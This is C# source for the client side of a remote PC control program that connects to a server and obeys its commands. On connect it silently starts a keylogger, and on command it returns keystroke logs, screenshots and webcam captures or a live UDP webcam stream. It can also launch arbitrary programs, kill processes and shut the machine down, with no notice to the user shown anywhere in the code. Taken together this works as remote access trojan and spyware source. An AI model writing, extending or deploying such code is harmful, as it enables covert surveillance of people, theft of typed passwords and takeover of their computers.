using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Diagnostics;
using System.Linq;
using System.IO;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using AForge.Video;
using AForge.Video.DirectShow;

namespace RemotePCControl
{
    public class ClientService
    {
        private TcpClient client;
        private NetworkStream stream;
        private string serverIp;
        private int serverPort;
        private string localIp;
        private string password;
        private bool isRunning = false;
        private KeyLogger keyLogger;

        // ==================== UDP STREAMING (NETWORK LAYER) ====================
        // UDP socket used to send webcam/screen frames and receive ping packets.
        // All streaming data (video/screen frames) MUST go through UDP, not TCP.
        private UdpClient udpClient;
        private IPEndPoint udpServerEndPoint;

        private const int UdpStreamPort = 9999;
        private const int UdpMaxPayload = 1400;
        private int currentFrameId = 0;

        // ==================== UDP PROTOCOL ====================
        //
        // Each UDP packet has the following binary header (total 24 bytes):
        // 0 - 3   : frame_id      (Int32, monotonically increasing for each frame)
        // 4 - 5   : packet_index  (Int16, 0 .. total_packets-1)
        // 6 - 7   : total_packets (Int16, total number of packets for this frame)
        // 8 - 15  : timestamp_ms  (Int64, Unix time milliseconds when the frame was created)
        // 16      : packet_type   (byte) 0 = frame data, 1 = PING, 2 = PONG (ping reply)
        // 17 - 23 : reserved      (7 bytes, for future extensions)
        //
        // With packet_type = 0 (frame data) the payload after the header is
        // a slice of the JPEG-encoded frame buffer.
        //
        // With packet_type = 1 (PING) or 2 (PONG) there is usually no payload,
        // we only use frame_id + timestamp_ms to measure RTT.

        // Webcam streaming variables
        private VideoCaptureDevice videoDevice;
        private bool isStreamingWebcam = false;
        private Bitmap lastWebcamFrame = null;
        private readonly object frameLock = new object();

        public ClientService(string serverIp, int serverPort)
        {
            this.serverIp = serverIp;
            this.serverPort = serverPort;
            this.localIp = GetLocalIPAddress();
            this.password = GeneratePassword();
        }

        public string LocalIp => localIp;
        public string Password => password;

        private string GetLocalIPAddress()
        {
            try
            {
                var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == AddressFamily.InterNetwork)
                    {
                        return ip.ToString();
                    }
                }
            }
            catch { }
            return "127.0.0.1";
        }

        private string GeneratePassword()
        {
            Random random = new Random();
            return random.Next(100000, 999999).ToString();
        }

        public bool Connect()
        {
            try
            {
                client = new TcpClient();
                client.Connect(serverIp, serverPort);
                stream = client.GetStream();
                isRunning = true;

                udpClient = new UdpClient();
                udpServerEndPoint = new IPEndPoint(IPAddress.Parse(serverIp), UdpStreamPort);

                _ = Task.Run(UdpReceiveLoop);

                string registerMessage = $"REGISTER_CONTROLLED|{localIp}|{password}";
                SendMessage(registerMessage);

                Thread listenThread = new Thread(ListenForCommands);
                listenThread.IsBackground = true;
                listenThread.Start();

                keyLogger = new KeyLogger();
                keyLogger.Start();

                Console.WriteLine($"[CLIENT] Connected to server");
                Console.WriteLine($"[INFO] IP: {localIp}");
                Console.WriteLine($"[INFO] Password: {password}");

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] Connection failed: {ex.Message}");
                return false;
            }
        }

        private void ListenForCommands()
        {
            byte[] lengthBuffer = new byte[4];

            while (isRunning && client.Connected)
            {
                try
                {
                    int bytesRead = 0;
                    while (bytesRead < 4)
                    {
                        int read = stream.Read(lengthBuffer, bytesRead, 4 - bytesRead);
                        if (read == 0) throw new Exception("Server disconnected");
                        bytesRead += read;
                    }
                    int messageLength = BitConverter.ToInt32(lengthBuffer, 0);

                    byte[] messageBuffer = new byte[messageLength];
                    bytesRead = 0;
                    while (bytesRead < messageLength)
                    {
                        int read = stream.Read(messageBuffer, bytesRead, messageLength - bytesRead);
                        if (read == 0) throw new Exception("Server disconnected");
                        bytesRead += read;
                    }

                    string message = Encoding.UTF8.GetString(messageBuffer, 0, messageLength);
                    Console.WriteLine($"[RECEIVED] {message.Substring(0, Math.Min(message.Length, 100))}");

                    ProcessCommand(message);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[ERROR] Listen: {ex.Message}");
                    break;
                }
            }
        }

        private void ProcessCommand(string message)
        {
            try
            {
                string[] parts = message.Split('|');
                if (parts[0] != "EXECUTE") return;

                string command = parts[1];
                string parameters = parts.Length > 2 ? string.Join("|", parts.Skip(2)) : "";

                string response = ExecuteCommand(command, parameters);
                SendResponse(response);
            }
            catch (Exception ex)
            {
                SendResponse($"ERROR|{ex.Message}");
            }
        }

        private string ExecuteCommand(string command, string parameters)
        {
            try
            {
                switch (command)
                {
                    case "LIST_APPS":
                        return ListApplications();
                    case "SEARCH_APPS":
                        return SearchApplications(parameters);
                    case "START_APP":
                        return StartApplication(parameters);
                    case "STOP_APP":
                        return StopApplication(parameters);
                    case "LIST_PROCESSES":
                        return ListProcesses();
                    case "START_PROCESS":
                        return StartProcess(parameters);
                    case "STOP_PROCESS":
                        return StopProcess(parameters);
                    case "SCREENSHOT":
                        return TakeScreenshot();
                    case "GET_KEYLOGS":
                        return GetKeyLogs();
                    case "CLEAR_KEYLOGS":
                        keyLogger.Clear();
                        return "SUCCESS|Keylogs cleared";
                    case "SHUTDOWN":
                        ShutdownPC();
                        return "SUCCESS|Shutting down";
                    case "RESTART":
                        RestartPC();
                        return "SUCCESS|Restarting";
                    case "WEBCAM_ON":
                        return StartWebcam();
                    case "WEBCAM_OFF":
                        return StopWebcam();
                    case "WEBCAM_STREAM_START":
                        return StartWebcamStreaming();
                    case "WEBCAM_STREAM_STOP":
                        return StopWebcamStreaming();
                    case "WEBCAM_CAPTURE":
                        return CaptureWebcam();
                    default:
                        return $"ERROR|Unknown command: {command}";
                }
            }
            catch (Exception ex)
            {
                return $"ERROR|{ex.Message}";
            }
        }

        private string ListApplications()
        {
            var apps = Process.GetProcesses()
                .Where(p => !string.IsNullOrEmpty(p.MainWindowTitle))
                .Select(p => $"{p.ProcessName}:{p.Id}:{p.MainWindowTitle}")
                .ToList();
            return $"APPS|{string.Join("||", apps)}";
        }

        private string SearchApplications(string searchQuery)
        {
            try
            {
                var results = new List<string>();
                string searchLower = searchQuery.ToLower();

                string startMenuPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu), "Programs");
                SearchInDirectory(startMenuPath, searchLower, results);

                string commonStartMenu = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartMenu), "Programs");
                SearchInDirectory(commonStartMenu, searchLower, results);

                string[] programFilesPaths = {
                    Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                    Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86)
                };

                foreach (var programFilesPath in programFilesPaths)
                {
                    if (Directory.Exists(programFilesPath))
                    {
                        SearchInDirectory(programFilesPath, searchLower, results, maxDepth: 2);
                    }
                }

                string pathEnv = Environment.GetEnvironmentVariable("PATH");
                if (!string.IsNullOrEmpty(pathEnv))
                {
                    foreach (var path in pathEnv.Split(Path.PathSeparator))
                    {
                        if (Directory.Exists(path))
                        {
                            try
                            {
                                var exeFiles = Directory.GetFiles(path, "*.exe", SearchOption.TopDirectoryOnly);
                                foreach (var exe in exeFiles)
                                {
                                    string fileName = Path.GetFileNameWithoutExtension(exe).ToLower();
                                    if (fileName.Contains(searchLower))
                                    {
                                        string displayName = Path.GetFileName(exe);
                                        if (!results.Contains($"{displayName}:{exe}"))
                                        {
                                            results.Add($"{displayName}:{exe}");
                                        }
                                    }
                                }
                            }
                            catch { }
                        }
                    }
                }

                var limitedResults = results.Take(50).ToList();
                return $"SEARCH_APPS|{string.Join("||", limitedResults)}";
            }
            catch (Exception ex)
            {
                return $"ERROR|Search failed: {ex.Message}";
            }
        }

        private void SearchInDirectory(string directory, string searchQuery, List<string> results, int maxDepth = 3, int currentDepth = 0)
        {
            if (currentDepth >= maxDepth || !Directory.Exists(directory)) return;

            try
            {
                var lnkFiles = Directory.GetFiles(directory, "*.lnk", SearchOption.TopDirectoryOnly);
                foreach (var lnk in lnkFiles)
                {
                    string fileName = Path.GetFileNameWithoutExtension(lnk).ToLower();
                    if (fileName.Contains(searchQuery))
                    {
                        string displayName = Path.GetFileNameWithoutExtension(lnk);
                        if (!results.Any(r => r.StartsWith($"{displayName}:")))
                        {
                            results.Add($"{displayName}:{lnk}");
                        }
                    }
                }

                var exeFiles = Directory.GetFiles(directory, "*.exe", SearchOption.TopDirectoryOnly);
                foreach (var exe in exeFiles)
                {
                    string fileName = Path.GetFileNameWithoutExtension(exe).ToLower();
                    if (fileName.Contains(searchQuery))
                    {
                        string displayName = Path.GetFileNameWithoutExtension(exe);
                        if (!results.Any(r => r.StartsWith($"{displayName}:")))
                        {
                            results.Add($"{displayName}:{exe}");
                        }
                    }
                }

                if (currentDepth < maxDepth - 1)
                {
                    var subDirs = Directory.GetDirectories(directory);
                    foreach (var subDir in subDirs)
                    {
                        SearchInDirectory(subDir, searchQuery, results, maxDepth, currentDepth + 1);
                    }
                }
            }
            catch { }
        }

        private string StartApplication(string appPath)
        {
            try
            {
                if (appPath.EndsWith(".lnk", StringComparison.OrdinalIgnoreCase))
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = appPath,
                        UseShellExecute = true
                    });
                }
                else
                {
                    Process.Start(appPath);
                }
                return $"SUCCESS|Started {appPath}";
            }
            catch (Exception ex)
            {
                return $"ERROR|Failed to start: {ex.Message}";
            }
        }

        private string StopApplication(string processIdStr)
        {
            int processId = int.Parse(processIdStr);
            var process = Process.GetProcessById(processId);
            process.Kill();
            return $"SUCCESS|Stopped process {processId}";
        }

        private string ListProcesses()
        {
            var processes = Process.GetProcesses()
                .Select(p => $"{p.ProcessName}:{p.Id}:{GetProcessMemory(p)}")
                .ToList();
            return $"PROCESSES|{string.Join("||", processes)}";
        }

        private string GetProcessMemory(Process process)
        {
            try
            {
                return $"{process.WorkingSet64 / 1024 / 1024}MB";
            }
            catch
            {
                return "N/A";
            }
        }

        private string StartProcess(string processName)
        {
            Process.Start(processName);
            return $"SUCCESS|Started {processName}";
        }

        private string StopProcess(string processIdStr)
        {
            int processId = int.Parse(processIdStr);
            var process = Process.GetProcessById(processId);
            process.Kill();
            return $"SUCCESS|Stopped process {processId}";
        }

        private string TakeScreenshot()
        {
            try
            {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }

                    using (MemoryStream ms = new MemoryStream())
                    {
                        bitmap.Save(ms, ImageFormat.Jpeg);
                        byte[] imageBytes = ms.ToArray();
                        string base64 = Convert.ToBase64String(imageBytes);
                        return $"SCREENSHOT|{base64}";
                    }
                }
            }
            catch (Exception ex)
            {
                return $"ERROR|Screenshot failed: {ex.Message}";
            }
        }

        private string GetKeyLogs()
        {
            string logs = keyLogger.GetLogs();
            return $"KEYLOGS|{logs}";
        }

        private void ShutdownPC()
        {
            Process.Start("shutdown", "/s /t 0");
        }

        private void RestartPC()
        {
            Process.Start("shutdown", "/r /t 0");
        }

        // ==================== WEBCAM METHODS ====================

        private string StartWebcam()
        {
            try
            {
                FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                if (videoDevices.Count == 0)
                    return "ERROR|No webcam found";

                FilterInfo bestCamera = FindBestCamera(videoDevices);
                if (bestCamera == null)
                    return "ERROR|No suitable camera found";

                videoDevice = new VideoCaptureDevice(bestCamera.MonikerString);

                if (videoDevice.VideoCapabilities.Length > 0)
                {
                    var bestCapability = videoDevice.VideoCapabilities
                        .OrderByDescending(c => c.FrameSize.Width * c.FrameSize.Height)
                        .ThenByDescending(c => c.AverageFrameRate)
                        .First();

                    videoDevice.VideoResolution = bestCapability;
                    Console.WriteLine($"[WEBCAM] Resolution: {bestCapability.FrameSize.Width}x{bestCapability.FrameSize.Height} @ {bestCapability.AverageFrameRate}fps");
                }

                videoDevice.NewFrame += VideoDevice_NewFrame;
                videoDevice.Start();

                Console.WriteLine("[WEBCAM] Auto-starting streaming...");
                Thread.Sleep(500);
                
                isStreamingWebcam = true;
                Thread streamThread = new Thread(StreamWebcamFrames);
                streamThread.IsBackground = true;
                streamThread.Start();

                return $"SUCCESS|Webcam started and streaming: {bestCamera.Name}";
            }
            catch (Exception ex)
            {
                return $"ERROR|{ex.Message}";
            }
        }

        private FilterInfo FindBestCamera(FilterInfoCollection devices)
        {
            string[] blacklist = new[]
            {
                "virtual", "obs", "snap", "droidcam", "iriun", "epoccam", "manycam",
                "xsplit", "vcam", "e2esoft", "splitcam", "webcammax", "chromacam",
                "nvidia broadcast", "ir camera", "infrared", "depth", "windows hello",
                "intel(r) virtual"
            };

            string[] whitelist = new[]
            {
                "hd", "fhd", "1080p", "720p", "4k", "usb", "integrated", "built-in",
                "logitech", "microsoft", "hp", "dell", "asus", "lenovo", "razer"
            };

            var candidates = new List<CameraCandidate>();

            foreach (FilterInfo device in devices)
            {
                string deviceNameLower = device.Name.ToLower();
                Console.WriteLine($"[WEBCAM] Scanning: {device.Name}");

                bool isBlacklisted = blacklist.Any(keyword => deviceNameLower.Contains(keyword));
                if (isBlacklisted)
                {
                    Console.WriteLine($"[WEBCAM] -> Skipped (blacklisted)");
                    continue;
                }

                int score = 0;

                foreach (var keyword in whitelist)
                {
                    if (deviceNameLower.Contains(keyword))
                    {
                        score += 10;
                    }
                }

                try
                {
                    var tempDevice = new VideoCaptureDevice(device.MonikerString);
                    if (tempDevice.VideoCapabilities.Length > 0)
                    {
                        var maxResolution = tempDevice.VideoCapabilities
                            .Max(c => c.FrameSize.Width * c.FrameSize.Height);

                        if (maxResolution >= 1920 * 1080) score += 50;
                        else if (maxResolution >= 1280 * 720) score += 30;
                        else if (maxResolution >= 640 * 480) score += 10;

                        var maxFrameRate = tempDevice.VideoCapabilities
                            .Max(c => c.AverageFrameRate);
                        if (maxFrameRate >= 60) score += 20;
                        else if (maxFrameRate >= 30) score += 10;
                    }
                }
                catch
                {
                    score -= 20;
                }

                candidates.Add(new CameraCandidate
                {
                    Device = device,
                    Score = score
                });

                Console.WriteLine($"[WEBCAM] -> Score: {score}");
            }

            var bestCandidate = candidates.OrderByDescending(c => c.Score).FirstOrDefault();

            if (bestCandidate != null && bestCandidate.Score > 0)
            {
                Console.WriteLine($"[WEBCAM] ✓ SELECTED: {bestCandidate.Device.Name} (Score: {bestCandidate.Score})");
                return bestCandidate.Device;
            }

            var fallback = devices.Cast<FilterInfo>()
                .FirstOrDefault(d => !blacklist.Any(k => d.Name.ToLower().Contains(k)));

            if (fallback != null)
            {
                Console.WriteLine($"[WEBCAM] Using fallback: {fallback.Name}");
            }

            return fallback;
        }

        private void VideoDevice_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            try
            {
                lock (frameLock)
                {
                    lastWebcamFrame?.Dispose();
                    lastWebcamFrame = (Bitmap)eventArgs.Frame.Clone();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] Frame capture: {ex.Message}");
            }
        }

        private string StartWebcamStreaming()
        {
            try
            {
                if (videoDevice == null || !videoDevice.IsRunning)
                    return "ERROR|Webcam not started. Please start webcam first.";

                if (isStreamingWebcam)
                    return "ERROR|Streaming already running";

                isStreamingWebcam = true;

                Thread streamThread = new Thread(StreamWebcamFrames);
                streamThread.IsBackground = true;
                streamThread.Start();

                Console.WriteLine("[WEBCAM] Streaming started");
                return "SUCCESS|Webcam streaming started";
            }
            catch (Exception ex)
            {
                return $"ERROR|{ex.Message}";
            }
        }

        private void StreamWebcamFrames()
        {
            int framesSent = 0;
            DateTime startTime = DateTime.Now;

            while (isStreamingWebcam && videoDevice != null && videoDevice.IsRunning)
            {
                try
                {
                    if (TryGetWebcamFrameBytes(out byte[] frameBytes, out long timestampMs))
                    {
                        SendFrameOverUdp(frameBytes, timestampMs);
                        framesSent++;

                        if (framesSent % 75 == 0)
                        {
                            double elapsed = (DateTime.Now - startTime).TotalSeconds;
                            double fps = framesSent / elapsed;
                            Console.WriteLine($"[WEBCAM] Streaming (UDP): {framesSent} frames sent, {fps:F1} fps");
                        }
                    }

                    Thread.Sleep(66); // ~15 FPS
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[ERROR] Stream frame: {ex.Message}");
                    Thread.Sleep(100);
                }
            }

            Console.WriteLine($"[WEBCAM] Streaming stopped. Total frames sent: {framesSent}");
        }

        private string StopWebcamStreaming()
        {
            if (!isStreamingWebcam)
                return "ERROR|Streaming not running";

            isStreamingWebcam = false;
            Console.WriteLine("[WEBCAM] Streaming stopped");
            return "SUCCESS|Webcam streaming stopped";
        }

        /// <summary>
        /// Capture the latest webcam frame and encode it as JPEG bytes.
        /// The network layer is responsible for fragmentation.
        /// </summary>
        private bool TryGetWebcamFrameBytes(out byte[] imageBytes, out long timestampMs)
        {
            imageBytes = Array.Empty<byte>();
            timestampMs = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();

            try
            {
                lock (frameLock)
                {
                    if (lastWebcamFrame == null)
                        return false;

                    using (MemoryStream ms = new MemoryStream())
                    {
                        var encoderParams = new EncoderParameters(1);
                        encoderParams.Param[0] = new EncoderParameter(
                            System.Drawing.Imaging.Encoder.Quality, 60L);

                        var jpegCodec = GetEncoderInfo("image/jpeg");
                        lastWebcamFrame.Save(ms, jpegCodec, encoderParams);

                        imageBytes = ms.ToArray();
                        timestampMs = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
                        return true;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] Get webcam frame bytes: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Send a JPEG frame over UDP, split into multiple packets.
        /// Designed to avoid blocking the capture/render thread.
        /// </summary>
        private async void SendFrameOverUdp(byte[] frameBytes, long timestampMs)
        {
            if (udpClient == null || udpServerEndPoint == null || frameBytes == null || frameBytes.Length == 0)
                return;

            try
            {
                int frameId = Interlocked.Increment(ref currentFrameId);
                int totalPackets = (frameBytes.Length + UdpMaxPayload - 1) / UdpMaxPayload;

                for (int packetIndex = 0; packetIndex < totalPackets; packetIndex++)
                {
                    int offset = packetIndex * UdpMaxPayload;
                    int size = Math.Min(UdpMaxPayload, frameBytes.Length - offset);

                    byte[] packet = new byte[24 + size];

                    Array.Copy(BitConverter.GetBytes(frameId), 0, packet, 0, 4);
                    Array.Copy(BitConverter.GetBytes((short)packetIndex), 0, packet, 4, 2);
                    Array.Copy(BitConverter.GetBytes((short)totalPackets), 0, packet, 6, 2);
                    Array.Copy(BitConverter.GetBytes(timestampMs), 0, packet, 8, 8);
                    packet[16] = 0;

                    Buffer.BlockCopy(frameBytes, offset, packet, 24, size);

                    await udpClient.SendAsync(packet, packet.Length, udpServerEndPoint);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] SendFrameOverUdp: {ex.Message}");
            }
        }

        private ImageCodecInfo GetEncoderInfo(string mimeType)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.MimeType == mimeType)
                    return codec;
            }
            return null;
        }

        private string StopWebcam()
        {
            try
            {
                isStreamingWebcam = false;

                if (videoDevice != null)
                {
                    if (videoDevice.IsRunning)
                    {
                        videoDevice.NewFrame -= VideoDevice_NewFrame;
                        videoDevice.SignalToStop();
                        videoDevice.WaitForStop();
                    }
                    videoDevice = null;
                }

                lock (frameLock)
                {
                    lastWebcamFrame?.Dispose();
                    lastWebcamFrame = null;
                }

                Console.WriteLine("[WEBCAM] Camera stopped");
                return "SUCCESS|Webcam stopped";
            }
            catch (Exception ex)
            {
                return $"ERROR|{ex.Message}";
            }
        }

        private string CaptureWebcam()
        {
            try
            {
                if (videoDevice == null || !videoDevice.IsRunning)
                    return "ERROR|Webcam not running";

                lock (frameLock)
                {
                    if (lastWebcamFrame == null)
                        return "ERROR|No frame available";

                    using (MemoryStream ms = new MemoryStream())
                    {
                        lastWebcamFrame.Save(ms, ImageFormat.Jpeg);
                        byte[] imageBytes = ms.ToArray();
                        string base64 = Convert.ToBase64String(imageBytes);
                        return $"WEBCAM_IMAGE|{base64}";
                    }
                }
            }
            catch (Exception ex)
            {
                return $"ERROR|{ex.Message}";
            }
        }

        private class CameraCandidate
        {
            public FilterInfo Device { get; set; }
            public int Score { get; set; }
        }

        private void SendMessage(string message)
        {
            try
            {
                byte[] data = Encoding.UTF8.GetBytes(message);
                byte[] lengthPrefix = BitConverter.GetBytes(data.Length);

                stream.Write(lengthPrefix, 0, lengthPrefix.Length);
                stream.Write(data, 0, data.Length);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] Send message: {ex.Message}");
            }
        }

        private void SendResponse(string response)
        {
            try
            {
                string message = $"RESPONSE|{localIp}|{response}";
                SendMessage(message);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] Send response: {ex.Message}");
            }
        }

        public void Disconnect()
        {
            isRunning = false;
            isStreamingWebcam = false;
            keyLogger?.Stop();
            StopWebcam();

            lock (frameLock)
            {
                lastWebcamFrame?.Dispose();
                lastWebcamFrame = null;
            }

            stream?.Close();
            client?.Close();
            Console.WriteLine("[CLIENT] Disconnected");
        }

        /// <summary>
        /// UDP receive loop (ping, etc.). Does not block the main logic.
        /// </summary>
        private async Task UdpReceiveLoop()
        {
            if (udpClient == null) return;

            IPEndPoint remote = new IPEndPoint(IPAddress.Any, 0);

            while (isRunning)
            {
                try
                {
                    UdpReceiveResult result = await udpClient.ReceiveAsync();
                    byte[] buffer = result.Buffer;

                    if (buffer.Length < 24) continue; // at least header size

                    byte packetType = buffer[16];

                    // Currently the client only needs to handle ping from the server
                    if (packetType == 1) // PING from server -> reply with PONG
                    {
                        buffer[16] = 2; // change packet_type to PONG
                        await udpClient.SendAsync(buffer, buffer.Length, result.RemoteEndPoint);
                    }
                }
                catch (ObjectDisposedException)
                {
                    // Socket was closed during Disconnect()
                    break;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[ERROR] UdpReceiveLoop: {ex.Message}");
                    await Task.Delay(100);
                }
            }
        }
    }

    public class KeyLogger
    {
        private StringBuilder logs = new StringBuilder();
        private bool isRunning = false;

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        public void Start()
        {
            isRunning = true;
            Thread thread = new Thread(LogKeys);
            thread.IsBackground = true;
            thread.Start();
        }

        private void LogKeys()
        {
            while (isRunning)
            {
                Thread.Sleep(10);
                for (int i = 0; i < 255; i++)
                {
                    short state = GetAsyncKeyState(i);
                    if ((state & 0x8000) != 0)
                    {
                        string key = ((Keys)i).ToString();
                        logs.Append($"[{DateTime.Now:HH:mm:ss}] {key}\n");
                    }
                }
            }
        }

        public string GetLogs()
        {
            return logs.ToString();
        }

        public void Clear()
        {
            logs.Clear();
        }

        public void Stop()
        {
            isRunning = false;
        }
    }
}